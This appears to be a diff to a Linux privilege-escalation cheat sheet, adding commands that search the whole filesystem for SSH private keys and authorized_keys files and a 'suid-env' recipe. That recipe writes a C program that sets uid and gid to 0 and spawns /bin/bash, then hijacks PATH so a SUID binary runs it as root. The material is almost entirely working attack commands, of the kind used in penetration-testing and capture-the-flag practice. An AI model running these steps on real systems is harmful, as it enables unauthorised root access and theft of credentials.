@@ -28,9 +28,13 @@ ls -ltrh /etc/shadow
 ls -ltrh /etc/crontab
 ls -ltrh /etc/sudoers
 
+find / -name id_rsa 2> /dev/null
+find / -name authorized_keys 2> /dev/null
+
 find / -type f -name "*.log" 2>/dev/null
 find / -type f -name "*.bak" 2>/dev/null
 find / -type f -name "*.conf" 2>/dev/null 
+
 
 searchsploit <protocol> <version>
 ```
@@ -234,6 +238,19 @@ chmod +s /tmp/mobin
 export PATH=/tmp:$PATH
 /usr/local/bin/suid-env
 ```
+### Environment Variables(3) ✡️
+```bash
+/usr/local/bin/suid-env
+strings /usr/local/bin/suid-env # service apache2 start
+nano /tmp/service.c
+-------------------
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
+-------------------
+gcc /tmp/service.c -o /tmp/service 
+export PATH=/tmp:$PATH
+/usr/local/bin/suid-env
+```
+
 
 ### Abusing Shell Features ✡️
 ```bash
